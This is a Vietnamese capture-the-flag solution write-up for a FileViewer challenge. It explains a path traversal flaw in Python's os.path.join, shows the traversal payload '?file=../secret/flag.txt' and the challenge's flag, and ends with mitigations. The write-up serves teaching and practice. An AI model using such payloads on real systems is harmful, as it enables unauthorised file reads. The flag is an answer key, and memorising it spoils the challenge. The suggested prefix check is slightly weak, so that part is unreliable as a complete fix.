# Thử thách 04: FileViewer - Giải pháp

## Loại lỗ hổng
**Path Traversal / Directory Traversal (Duyệt thư mục)**

## Mô tả
Ứng dụng sử dụng hàm `os.path.join()` với dữ liệu đầu vào từ người dùng nhưng không qua bộ lọc an toàn (sanitization). Điều này cho phép kẻ tấn công đọc các file nằm ngoài thư mục dự kiến bằng cách sử dụng các chuỗi đường dẫn tương đối (như `../`).

## Mã nguồn chứa lỗ hổng
```python
# VULNERABLE: path join without sanitization
path = os.path.join(FILES_DIR, filename)
```

## Khai thác (Exploit)

1. Ứng dụng dự kiến sẽ đọc các tệp từ thư mục `/tmp/files/`.
2. Theo gợi ý, Flag được cất giấu tại đường dẫn `/tmp/secret/flag.txt`.
3. Chúng ta có thể dùng chuỗi `../` để nhảy ra ngoài thư mục hiện tại.
4. Gửi request tới URL: `/?file=../secret/flag.txt`

## Payload
```
?file=../secret/flag.txt
```

## Flag
```
FCTF{p4th_tr4v3rs4l_g0es_brrrr}
```

## Cách hoạt động
- Khởi tạo thư mục gốc: `FILES_DIR = "/tmp/files"`
- Người dùng truyền tham số: `../secret/flag.txt`
- Code thực thi: `os.path.join("/tmp/files", "../secret/flag.txt")` = `/tmp/files/../secret/flag.txt`
- Đường dẫn này sau đó sẽ trỏ tới file thực tế: `/tmp/secret/flag.txt`

## Biện pháp phòng ngừa (Mitigation)
- Luôn kiểm tra và chuẩn hóa đường dẫn file.
- Lấy đường dẫn tuyệt đối bằng `os.path.abspath()` và xác minh rằng file đó vẫn nằm trong thư mục cho phép:
  ```python
  path = os.path.abspath(os.path.join(FILES_DIR, filename))
  if not path.startswith(os.path.abspath(FILES_DIR)):
      abort(403)
  ```
- Duyệt qua một Whitelist (danh sách trắng) chứa tên các file hợp lệ.
- Không bao giờ tin tưởng hoàn toàn tên file do người dùng cung cấp.
- Giải pháp tốt nhất là sử dụng ID của file (số nguyên hoặc UUID) thay vì truyền trực tiếp tên file.
